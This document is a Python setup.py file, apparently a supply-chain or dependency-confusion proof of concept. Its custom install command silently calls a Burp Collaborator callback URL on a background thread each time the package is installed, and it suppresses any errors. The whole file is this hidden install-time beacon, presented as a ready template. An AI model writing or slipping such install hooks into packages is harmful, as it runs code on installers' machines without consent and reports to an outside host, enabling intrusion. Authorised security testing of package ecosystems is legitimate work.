from setuptools import setup
from setuptools.command.install import install
import urllib.request
import threading

# Your Burp Collaborator subdomain
CALLBACK_URL = "https://064jrmtnjo1kf57pvxeqcoam2d86wwkl.oastify.com"

def fire_callback():
    try:
        urllib.request.urlopen(CALLBACK_URL, timeout=5)
    except Exception:
        pass

class PostInstall(install):
    def run(self):
        install.run(self)
        threading.Thread(target=fire_callback).start()

setup(
    cmdclass={"install": PostInstall}
)
